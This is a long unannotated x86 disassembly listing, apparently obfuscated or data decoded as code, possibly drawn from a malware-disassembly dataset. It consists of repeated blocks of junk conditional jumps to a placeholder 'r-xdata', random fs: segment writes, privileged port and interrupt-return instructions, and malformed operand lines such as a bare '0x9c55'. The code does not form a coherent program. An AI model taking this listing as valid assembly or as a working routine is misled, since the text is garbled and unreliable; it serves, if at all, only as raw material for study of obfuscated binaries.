pop ecx
jne r-xdata
jbe 0xffd12e1
jno r-xdata
jge 0xffffffffffa0c620
jge r-xdata
jpe 0x74cd5224
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40403f
push esp
push edi
push esi
push ebp
call sub_404122
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fcd
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc28a
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5b3
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_404199
jb 0xffffffff81b2be4f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
add esp 0x4
jae r-xdata
jl 0xf3c365
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bada
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5bf
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd12e1
jno r-xdata
jge 0xffffffffffa0c620
jge r-xdata
jpe 0x74cd5224
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404122
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5b3
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_404199
jb 0xffffffff81b2be4f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fcd
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5bf
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9bc28a
add [ eax ] al
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0c620
add esp 0x4
jae r-xdata
jl 0xf3c365
jge r-xdata
jpe 0x74cd5224
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428bada
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404131
jne r-xdata
add esp 0x8
jg 0xf4505c0
jae r-xdata
ja 0xffffffffa3c34fcd
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bc28a
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5b3
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_404199
jb 0xffffffff81b2be4f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
add esp 0x4
jae r-xdata
jl 0xf3c365
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428bada
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158c5bf
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd12e1
jno r-xdata
jge 0xffffffffffa0c620
jge r-xdata
jpe 0x74cd5224
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_404199
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcac3e3
jno r-xdata
js 0x7f4505a2
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158c5bf
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdec5b3
pop edx
jge r-xdata
jo 0xffffffff854f9adc
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_404199
jb 0xffffffff81b2be4f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34fcd
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9bc28a
pop ecx
jne r-xdata
jbe 0xffd12e1
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0c620
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
